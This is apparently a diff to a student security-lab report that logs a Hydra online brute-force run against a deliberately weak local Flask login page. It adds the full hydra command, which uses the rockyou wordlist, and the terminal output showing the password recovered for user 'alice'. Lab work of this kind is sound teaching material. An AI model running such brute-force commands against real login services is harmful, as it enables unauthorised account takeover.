@@ -1,5 +1,5 @@
 # ==============================================================================
-# AUTHSHIELD - STEP 14: HYDRA ONLINE BRUTE-FORCE RESULTS (WEAK APP)
+# AUTHSHIELD -  HYDRA ONLINE BRUTE-FORCE RESULTS (WEAK APP)
 # ==============================================================================
 # Target Application : app/app_v1_weak.py (http://<TARGET_IP>:5000/login)
 # Tool               : Hydra v9.5 (http-post-form)
@@ -31,7 +31,7 @@
 
 ## 3. RAW TERMINAL AUDIT LOG (EVIDENCE FOR REPORT)
 
-```text
+prianto@prianto:/mnt/c/Work/Trimester/13th trimester/Computer Security/AuthShield$ hydra -l alice -P wordlists/rockyou.txt <TARGET_IP> -s 5000 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-11 20:12:32
@@ -40,5 +40,6 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-11-11 20:12:
 [DATA] attacking http-post-form://<TARGET_IP>:5000/login:username=^USER^&password=^PASS^:F=incorrect
 [5000][http-post-form] host: <TARGET_IP>   login: alice   password: password123
 1 of 1 target successfully completed, 1 valid password found
-```
+prianto@prianto:/mnt/c/Work/Trimester/13th trimester/Computer Security/AuthShield$ 
+
 
